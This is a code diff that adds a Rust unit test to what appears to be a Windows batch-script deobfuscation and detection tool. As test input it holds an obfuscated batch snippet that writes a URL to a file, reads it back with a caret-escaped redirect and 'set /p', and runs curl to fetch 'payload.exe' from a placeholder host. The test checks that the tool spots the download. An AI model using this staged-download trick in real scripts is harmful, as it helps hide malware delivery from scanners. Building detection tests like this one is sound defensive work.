@@ -546,6 +546,29 @@ curl -o payload.exe %U%"#,
             report.deobfuscated
         );
     }
+
+    #[test]
+    fn set_p_reads_first_line_from_prefix_redirected_file() {
+        let report = analyze(
+            br#"echo https://set-p-prefix-read.example/payload.exe>url.txt
+^< url.txt set /p U=
+curl -o payload.exe %U%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://set-p-prefix-read.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "set /p did not read prefix-redirected staged content: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
 }
 
 #[cfg(test)]
